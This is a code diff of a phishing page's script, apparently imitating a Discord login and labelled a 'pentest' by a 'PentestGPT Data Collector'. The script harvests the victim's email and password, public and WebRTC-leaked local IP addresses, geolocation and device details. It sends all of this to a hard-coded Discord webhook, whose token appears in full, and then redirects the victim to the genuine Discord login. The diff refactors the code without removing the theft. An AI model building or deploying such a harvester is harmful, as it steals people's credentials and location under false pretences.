@@ -139,144 +139,149 @@
             connexion: navigator.connection ? navigator.connection.effectiveType : "Inconnue"
         };
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                infos.ip_publique = data.ip;
-                obtenirIPLocale(infos);
-            })
-            .catch(() => {
-                infos.ip_publique = "Non disponible";
-                obtenirIPLocale(infos);
-            });
-    }
+        // Fonction pour obtenir l'IP publique
+        function getPublicIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    infos.ip_publique = data.ip;
+                })
+                .catch(() => {
+                    infos.ip_publique = "Non disponible";
+                });
+        }
 
-    function obtenirIPLocale(infos) {
-        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        // Fonction pour obtenir les IP locales via WebRTC
+        function getLocalIPs() {
+            return new Promise((resolve) => {
+                var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (RTCPeerConnection) {
+                    try {
+                        var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                        var ips = [];
 
-        if (RTCPeerConnection) {
-            try {
-                var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                var ips = [];
+                        pc.createDataChannel("");
+                        pc.createOffer().then(pc.setLocalDescription.bind(pc));
 
-                pc.createDataChannel("");
-                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                        pc.onicecandidate = function (ice) {
+                            if (!ice || !ice.candidate) return;
+                            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                            if (myIP && ips.indexOf(myIP[1]) === -1) {
+                                ips.push(myIP[1]);
+                            }
+                        };
 
-                pc.onicecandidate = function (ice) {
-                    if (!ice || !ice.candidate) return;
-                    var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                    if (myIP && ips.indexOf(myIP[1]) === -1) {
-                        ips.push(myIP[1]);
+                        setTimeout(() => {
+                            infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées";
+                            pc.close();
+                            resolve();
+                        }, 2000);
+                    } catch (e) {
+                        infos.ip_locales = "Erreur WebRTC";
+                        resolve();
                     }
-                };
-
-                setTimeout(() => {
-                    infos.ip_locales = ips.length > 0 ? ips.join(', ') : "Non détectées";
-                    pc.close();
-                    obtenirGeolocalisation(infos);
-                }, 2000);
-            } catch (e) {
-                infos.ip_locales = "Erreur WebRTC";
-                obtenirGeolocalisation(infos);
-            }
-        } else {
-            infos.ip_locales = "WebRTC non supporté";
-            obtenirGeolocalisation(infos);
-        }
-    }
-
-    function obtenirGeolocalisation(infos) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function (position) {
-                    infos.latitude = position.coords.latitude.toFixed(6);
-                    infos.longitude = position.coords.longitude.toFixed(6);
-                    infos.precision = position.coords.accuracy + 'm';
-                    envoyerVersDiscord(infos);
-                },
-                function (error) {
-                    infos.geolocalisation = "Refusée: " + error.message;
-                    envoyerVersDiscord(infos);
-                },
-                { timeout: 5000 }
-            );
-        } else {
-            infos.geolocalisation = "Non supportée";
-            envoyerVersDiscord(infos);
-        }
-    }
-
-    function envoyerVersDiscord(infos) {
-        var message = {
-            content: "🎯 **NOUVELLE COLLECTE - PENTEST**",
-            embeds: [{
-                title: "📊 Informations Collectées",
-                color: 3066993,
-                fields: [
-                    {
-                        name: "🔑 Identifiants",
-                        value: "**Email:** " + infos.email + "\n**Mot de passe:** " + infos.password,
-                        inline: false
-                    },
-                    {
-                        name: "🌐 Adresses IP",
-                        value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
-                        inline: false
-                    },
-                    {
-                        name: "📱 Système",
-                        value: "**Plateforme:** " + infos.plateforme + "\n**Écran:** " + infos.ecran,
-                        inline: true
-                    },
-                    {
-                        name: "🌍 Localisation",
-                        value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
-                        inline: true
-                    },
-                    {
-                        name: "🕒 Horodatage",
-                        value: infos.horodatage,
-                        inline: false
-                    },
-                    {
-                        name: "🔗 Source",
-                        value: infos.url,
-                        inline: false
-                    },
-                    {
-                          "💳 Payment Methods": {
-                          "API Supported": true,
-                          "Autofill Detected": "✅ (cardnumber: •••• 4242)",
-                          "Insecure Forms": "⚠️ 1 (http://example.com/pay)"
-                          }
-                    },
-                ],
-                timestamp: infos.horodatage,
-                footer: {
-                    text: "PentestGPT Data Collector"
+                } else {
+                    infos.ip_locales = "WebRTC non supporté";
+                    resolve();
                 }
-                
-            }]
-        };
+            });
+        }
 
-        var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE";
+        // Fonction pour obtenir la géolocalisation
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function (position) {
+                            infos.latitude = position.coords.latitude.toFixed(6);
+                            infos.longitude = position.coords.longitude.toFixed(6);
+                            infos.precision = position.coords.accuracy + 'm';
+                            resolve();
+                        },
+                        function (error) {
+                            infos.geolocalisation = "Refusée: " + error.message;
+                            resolve();
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    infos.geolocalisation = "Non supportée";
+                    resolve();
+                }
+            });
+        }
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(message)
-        }).then(function () {
-            setTimeout(function () {
-                window.location.href = 'https://discord.com/login';
-            }, 2000);
-        }).catch(function (error) {
-            console.error('Erreur:', error);
-            setTimeout(function () {
-                window.location.href = 'https://discord.com/login';
-            }, 2000);
-        });
+        // Fonction pour envoyer les données vers le webhook
+        function sendToWebhook() {
+            var message = {
+                content: "🎯 **NOUVELLE COLLECTE - PENTEST**",
+                embeds: [{
+                    title: "📊 Informations Collectées",
+                    color: 3066993,
+                    fields: [
+                        {
+                            name: "🔑 Identifiants",
+                            value: "**Email:** " + infos.email + "\n**Mot de passe:** " + infos.password,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 Adresses IP",
+                            value: "**Publique:** " + infos.ip_publique + "\n**Locale(s):** " + (infos.ip_locales || "N/A"),
+                            inline: false
+                        },
+                        {
+                            name: "📱 Système",
+                            value: "**Plateforme:** " + infos.plateforme + "\n**Écran:** " + infos.ecran,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 Localisation",
+                            value: infos.latitude ? ("**Lat:** " + infos.latitude + "\n**Lng:** " + infos.longitude) : (infos.geolocalisation || "Non disponible"),
+                            inline: true
+                        },
+                        {
+                            name: "🕒 Horodatage",
+                            value: infos.horodatage,
+                            inline: false
+                        },
+                        {
+                            name: "🔗 Source",
+                            value: infos.url,
+                            inline: false
+                        }
+                    ],
+                    timestamp: infos.horodatage,
+                    footer: {
+                        text: "PentestGPT Data Collector"
+                    }
+                }]
+            };
+
+            var webhookURL = "https://discord.com/api/webhooks/1398006998129184869/xTQjLLkm-7vx_99ahoCvtEx1QTpVAB2EyKMUtF3Y__yIgSKM_X7z19hTO7-iyd5nNjhE"; // Remplacez par votre webhook
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            }).then(function () {
+                setTimeout(function () {
+                    window.location.href = 'https://discord.com/login';
+                }, 2000);
+            }).catch(function (error) {
+                console.error('Erreur:', error);
+                setTimeout(function () {
+                    window.location.href = 'https://discord.com/login';
+                }, 2000);
+            });
+        }
+
+        // Exécution séquentielle des étapes
+        getPublicIP()
+            .then(getLocalIPs)
+            .then(getGeolocation)
+            .then(sendToWebhook)
+            .catch(console.error);
     }
 </script>
 </body>
 </html>
-
